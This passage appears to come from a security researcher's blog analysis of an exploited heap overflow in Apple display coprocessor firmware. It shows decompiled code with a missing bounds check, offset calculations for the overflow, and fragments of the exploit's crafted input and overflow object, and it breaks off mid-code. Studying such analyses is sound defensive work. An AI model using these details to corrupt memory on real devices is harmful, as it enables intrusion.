class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;pages&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;for&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;int&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;controlled_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;++)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;this_page&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;indirect_buffer_ptr&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;4&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;controlled_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; indirect_buffer_ptr &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;4&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;controlled_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; this_page &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x100&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; pages &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x4000&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;There's a distinct lack of bounds checking on &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;controlled_size&lt;/span&gt;&lt;span&gt;. Based on the structure of the code it looks like it should be restricted to be less than or equal to &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;64&lt;/span&gt;&lt;span&gt;&amp;nbsp;(as that would result in the input being completely copied to the output buffer.) The &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;compensator-&amp;gt;inline_buffer&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer is inline in the compensator object. The structure of the code makes it look that that buffer is probably &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0xc000&lt;/span&gt;&lt;span&gt;&amp;nbsp;(three 16k pages) large. To verify this we need to find the allocation site of this compensator object.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;It's read from the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;pipe_parent&lt;/span&gt;&lt;span&gt;&amp;nbsp;object and we know that at this point &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;pipe_parent&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UPPipeDCP_H13P&lt;/span&gt;&lt;span&gt;&amp;nbsp;object.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;There's only one write to that field, here in &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UPPipeDCP_H13P::setup_tunables_base_target&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.76bc35a503bf64e16502962e6e6a4632f74fe58f\"&gt;&lt;/a&gt;&lt;a id=\"t.29\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;compensator &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;CXXnew&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0xC608LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;compensator &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;compensator&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The compensator object is a &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0xc608&lt;/span&gt;&lt;span&gt;&amp;nbsp;byte allocation; the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0xc000&lt;/span&gt;&lt;span&gt;&amp;nbsp;sized buffer starts at offset &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x24&lt;/span&gt;&lt;span&gt;&amp;nbsp;so the allocation has enough space for &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0xc608-0x24=0xC5E4&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;bytes before corrupting neighbouring objects.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The structure input provided by the exploit for the block handler 19 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;call looks like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.ab31ebe17a793d09fa94c11be61a4134ecf08386\"&gt;&lt;/a&gt;&lt;a id=\"t.30\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;struct_input_for_block_handler_19&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x5F4&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;]&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;70&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c30\"&gt;// controlled_size&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;struct_input_for_block_handler_19&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x5F8&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;]&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;address&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;struct_input_for_block_handler_19&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0x600&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;]&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;a_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;This leads to a value of 70 (0x46) for &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;controlled_size&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UniformityCompensator::set&lt;/span&gt;&lt;span&gt;&amp;nbsp;snippet shown earlier. (&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x5f8&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x600&lt;/span&gt;&lt;span&gt;&amp;nbsp;correspond to the offsets we saw earlier in the subtype's table: &amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;&amp;lt;2, 0, 0x5F8, 0x600&amp;gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The inner loop increments the destination pointer by &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x100&lt;/span&gt;&lt;span&gt;&amp;nbsp;each iteration so &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x46&lt;/span&gt;&lt;span&gt;&amp;nbsp;loop iterations will write &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x4618&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;bytes.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The outer loop writes to three subsequent &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x4000&lt;/span&gt;&lt;span&gt;&amp;nbsp;byte blocks so the third (final) iteration starts writing at &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x24 + 0x8000&lt;/span&gt;&lt;span&gt;&amp;nbsp;and writes a total of &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x4618&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes, meaning the object would need to be &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0xC63C&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes; but we can see that it's only &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0xc608&lt;/span&gt;&lt;span&gt;, meaning that it will overflow the allocation size by &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x34&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes. The RTKit malloc implementation looks like it adds 8 bytes of metadata to each allocation so the next object starts at &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0xc610&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;How much input is consumed? The input is fully consumed with no \"rewinding\" so it's &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;3*0x46*0x46*4 = 0xe5b0&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes. Working backwards from the end of that buffer we know that the final &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x34&lt;/span&gt;&lt;span&gt;&amp;nbsp;bytes of it go off the end of the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0xc608&lt;/span&gt;&lt;span&gt;&amp;nbsp;allocation which means &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;+0xe57c&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the input buffer will be the first byte which corrupts the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;8&lt;/span&gt;&lt;span&gt;&amp;nbsp;metadata bytes and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;+0x8584&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;will be the first byte to corrupt the next object:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTc6JqgJIYvcwLtg14PNyjGRL4ds-1hzVvPPYmuSbJ3TiMHTXI3loB4Ib4caBv06WwUAa2H3eEldnlVKePnyUDTxYy6-W0VyMbVSn1YrcilcuOmjeYPwzdQ0ONiWlZbc34oZBXv6hftbOK57Qu_NupLfhgI-Iqc9U51KfJVF5YRk4YmBFcYdoaH27q/s1888/Screenshot%202022-06-22%20at%2016.54.15.png\" style=\"display: block; padding: 1em 0; text-align: center;\"&gt;&lt;img alt=\"A diagram showing that the end of the overflower object overlaps with the metadata and start of the target object.\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTc6JqgJIYvcwLtg14PNyjGRL4ds-1hzVvPPYmuSbJ3TiMHTXI3loB4Ib4caBv06WwUAa2H3eEldnlVKePnyUDTxYy6-W0VyMbVSn1YrcilcuOmjeYPwzdQ0ONiWlZbc34oZBXv6hftbOK57Qu_NupLfhgI-Iqc9U51KfJVF5YRk4YmBFcYdoaH27q/s1200/Screenshot%202022-06-22%20at%2016.54.15.png\" style=\"max-height: 750; max-width: 600px;\" title=\"A diagram showing that the end of the overflower object overlaps with the metadata and start of the target object.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;This matches up exactly with the overflow object which the exploit builds:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.87397a57c7bdef65de5578925dd0ccccbdee255a\"&gt;&lt;/a&gt;&lt;a id=\"t.31\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; v24 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;address &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c23\"&gt;0xE584&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; v25 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_DWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;v54&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;48&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; v26 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_OWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;v54&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;32&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; v27 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_OWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;v54&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;16&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_OWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;address &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c23\"&gt;0xE584&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_OWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;v54&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_OWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;v24 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;16&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;v27&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_OWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;v24 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;32&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;v26&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;_DWORD &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;v24 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;48&lt;/span&gt;&lt;span 